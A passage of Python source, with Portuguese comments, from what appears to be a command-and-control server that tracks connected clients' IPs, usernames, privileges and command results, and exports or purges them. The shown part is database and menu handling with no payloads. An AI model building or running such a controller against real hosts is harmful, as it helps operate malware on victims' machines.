[cyan]Clientes Conectados:[/cyan] {connected_clients}
[cyan]Comandos Executados:[/cyan] {total_commands}
[cyan]Logs de Atividade:[/cyan] {total_logs}
[cyan]Resultados Armazenados:[/cyan] {total_results}
[cyan]Tamanho do Arquivo:[/cyan] {db_size_mb:.2f} MB
[cyan]Arquivo:[/cyan] {self.config['database_file']}""",
                title="[bold green]ESTATÍSTICAS[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao obter estatísticas: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")
    
    def _encrypt_data(self, data: str) -> bytes:
        """Criptografa dados"""
        try:
            # Simples codificação base64 para demonstração
            # Em produção, use uma biblioteca de criptografia adequada
            return base64.urlsafe_b64encode(data.encode())
        except:
            return data.encode()
    
    def _decrypt_data(self, data: bytes) -> str:
        """Descriptografa dados"""
        try:
            return base64.urlsafe_b64decode(data).decode()
        except:
            return data.decode()
    
    def _disconnect_client(self, client_id: str):
        """Desconecta cliente e limpa recursos"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            
            # Atualizar status no banco de dados
            try:
                cursor = self.db_conn.cursor()
                cursor.execute(
                    "UPDATE clients SET status = 'disconnected', last_seen = ? WHERE id = ?",
                    (datetime.now().isoformat(), client_id)
                )
                self.db_conn.commit()
                self._log_activity(client_id, "CLIENT_DISCONNECTED")
            except Exception as e:
                console.print(f"[red]✗ Erro ao atualizar BD: {str(e)}[/red]")
            
            del self.clients[client_id]
            console.print(f"[yellow]📴 Cliente {client_id} desconectado[/yellow]")
    
    def _update_client_status(self, client_id: str, status: str):
        """Atualiza status do cliente"""
        if client_id in self.clients:
            try:
                cursor = self.db_conn.cursor()
                cursor.execute(
                    "UPDATE clients SET status = ?, last_seen = ? WHERE id = ?",
                    (status, datetime.now().isoformat(), client_id)
                )
                self.db_conn.commit()
            except Exception as e:
                console.print(f"[red]✗ Erro ao atualizar status: {str(e)}[/red]")
    
    def _exportar_dados(self):
        """Exporta dados do banco de dados"""
        try:
            export_file = Prompt.ask(
                "[yellow]?[/yellow] Nome do arquivo de exportação",
                default="c2_export.json"
            )
            
            cursor = self.db_conn.cursor()
            
            # Coletar todos os dados
            data = {
                'clients': [],
                'commands': [],
                'activity_logs': []
            }
            
            # Clientes
            cursor.execute("SELECT * FROM clients")
            for row in cursor.fetchall():
                data['clients'].append({
                    'id': row[0],
                    'ip': row[1],
                    'port': row[2],
                    'first_seen': row[3],
                    'last_seen': row[4],
                    'os': row[5],
                    'username': row[6],
                    'privileges': row[7],
                    'status': row[8],
                    'hostname': row[9]
                })
            
            # Comandos
            cursor.execute("SELECT * FROM commands")
            for row in cursor.fetchall():
                data['commands'].append({
                    'id': row[0],
                    'client_id': row[1],
                    'command': row[2],
                    'args': row[3],
                    'timestamp': row[4],
                    'status': row[5],
                    'result': row[6]
                })
            
            # Logs
            cursor.execute("SELECT * FROM activity_logs")
            for row in cursor.fetchall():
                data['activity_logs'].append({
                    'id': row[0],
                    'client_id': row[1],
                    'action': row[2],
                    'timestamp': row[3],
                    'details': row[4]
                })
            
            # Salvar em arquivo
            with open(export_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            console.print(f"[green]✅ Dados exportados para {export_file}[/green]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao exportar dados: {str(e)}[/red]")
        
        time.sleep(1)
    
    def _limpar_dados_antigos(self):
        """Limpa dados antigos do banco de dados"""
        try:
            dias = IntPrompt.ask(
                "[yellow]?[/yellow] Limpar dados com mais de quantos dias?",
                default=30
            )
            
            cursor = self.db_conn.cursor()
            
            # Calcular data limite
            limite = (datetime.now() - timedelta(days=dias)).isoformat()
            
            # Limpar logs antigos
            cursor.execute("DELETE FROM activity_logs WHERE timestamp < ?", (limite,))
            logs_apagados = cursor.rowcount
            
            # Limpar comandos antigos de clientes desconectados
            cursor.execute('''DELETE FROM commands 
                            WHERE timestamp < ? 
                            AND client_id IN (SELECT id FROM clients WHERE status = 'disconnected')''',
                         (limite,))
            commands_apagados = cursor.rowcount
            
            self.db_conn.commit()
            
            console.print(f"[green]✅ Dados limpos: {logs_apagados} logs e {commands_apagados} comandos removidos[/green]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao limpar dados: {str(e)}[/red]")
        
        time.sleep(1)
    
    def _otimizar_bd(self):
        """Otimiza o banco de dados"""
        try:
            cursor = self.db_conn.cursor()
            
            # Executar VACUUM para otimizar
            cursor.execute("VACUUM")
            self.db_conn.commit()
            
            console.print("[green]✅ Banco de dados otimizado com sucesso[/green]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao otimizar BD: {str(e)}[/red]")
        
        time.sleep(1)
    
    def _sair(self):
        """Procedimento de saída"""
        if self.running:
            self._parar_servidor()
        
        console.print(Panel.fit(
            "[blink bold red]⚠️ SERVIDOR C2 ENCERRADO ⚠️[/blink bold red]",
            border_style="red"
        ))
        time.sleep(1)
        sys.exit(0)

def main():
    c2_server = C2Server()
    c2_server.mostrar_menu_principal()

if __name__ == '__main__':
    main()
